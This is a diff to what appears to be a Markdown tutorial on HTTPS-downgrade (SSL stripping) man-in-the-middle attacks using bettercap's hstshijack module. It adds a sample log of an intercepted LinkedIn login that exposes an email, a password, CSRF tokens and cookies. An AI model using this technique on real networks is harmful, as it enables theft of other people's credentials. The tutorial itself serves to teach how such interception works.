@@ -439,3 +439,54 @@ The same can be performed using our automated script as well which is at the spe
 
 - Now, try visiting an HTTPS website on the target machine. You will see that the website is downgraded to HTTP and you can see all the HTTP requests and responses in real-time, including the username and password for HTTPS websites as well. Try with `linkedin.com`.
 
+- You will also see following logs for the downgraded websites in bettercap terminal:
+
+  ```bash
+  [hstshijack.callback] WHITELIST http://www.linkedin.com/gfBlfewWQZhOFo?csrfToken=ajax%3A5947626868625410696&parentPageKey=d_checkpoint_lg_consumer_login&pageInstance=urn%3Ali%3Apage%3Acheckpoint_lg_login_default%3Ba1x53njZQ4uqgUBytQk2ng%3D%3D&controlId=d_checkpoint_lg_consumer_login-SignInUsingOneTimeSignInLink&trk=guest_homepage-basic_nav-header-signin&loginCsrfParam=df9c9d67-b6b2-4be9-8d00-e0ff62407c91&trk=d_checkpoint_lg_consumer_login_microsoft-auth-submit&csrfToken=ajax%3A5947626868625410696&session_key=hello%40gmail.com&ac=0&loginFailureCount=0&sIdString=29c12fab-2d78-4ba0-a4b1-458085fe1d52&pkSupported=false&parentPageKey=d_checkpoint_lg_consumer_login&pageInstance=urn%3Ali%3Apage%3Acheckpoint_lg_login_default%3Ba1x53njZQ4uqgUBytQk2ng%3D%3D&trk=guest_homepage-basic_nav-header-signin&loginCsrfParam=df9c9d67-b6b2-4be9-8d00-e0ff62407c91&fp_data=default&apfc=%7B%7D&_d=d&showGoogleOneTapLogin=true&showAppleLogin=true&showMicrosoftLogin=true&controlId=d_checkpoint_lg_consumer_login-login_submit_button&session_password=passwOrd!&rememberMeOptIn=true
+    
+     Headers
+    
+       Origin: http://www.linkedin.com
+       Accept-Language: en-US
+       Cache-Control: no-cache
+       Referer: http://www.linkedin.com/login?fromSignIn=true&trk=guest_homepage-basic_nav-header-signin
+       User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763
+       Accept: */*
+       Pragma: no-cache
+       Content-Length: 0
+       Connection: Keep-Alive
+       Cookie: AMCVS_14215E3D5995C57C0A495C55%40AdobeOrg=1; AMCV_14215E3D5995C57C0A495C55%40AdobeOrg=-637568504%7CMCIDTS%7C20405%7CMCMID%7C11920635316301636343317023914832545490%7CMCOPTOUT-1762923467s%7CNONE%7CvVersion%7C5.1.1
+       
+     Query
+    
+       csrfToken : ajax:5947626868625410696
+       parentPageKey : d_checkpoint_lg_consumer_login
+       pageInstance : urn:li:page:checkpoint_lg_login_default;a1x53njZQ4uqgUBytQk2ng==
+       controlId : d_checkpoint_lg_consumer_login-SignInUsingOneTimeSignInLink
+       trk : guest_homepage-basic_nav-header-signin
+       loginCsrfParam : df9c9d67-b6b2-4be9-8d00-e0ff62407c91
+       trk : d_checkpoint_lg_consumer_login_microsoft-auth-submit
+       csrfToken : ajax:5947626868625410696
+       session_key : hello@gmail.com
+       ac : 0
+       loginFailureCount : 0
+       sIdString : 29c12fab-2d78-4ba0-a4b1-458085fe1d52
+       pkSupported : false
+       parentPageKey : d_checkpoint_lg_consumer_login
+       pageInstance : urn:li:page:checkpoint_lg_login_default;a1x53njZQ4uqgUBytQk2ng==
+       trk : guest_homepage-basic_nav-header-signin
+       loginCsrfParam : df9c9d67-b6b2-4be9-8d00-e0ff62407c91
+       fp_data : default
+       apfc : {}
+       _d : d
+       showGoogleOneTapLogin : true
+       showAppleLogin : true
+       showMicrosoftLogin : true
+       controlId : d_checkpoint_lg_consumer_login-login_submit_button
+       session_password : passwOrd!
+       rememberMeOptIn : true
+    
+     Body
+
+  ```
+
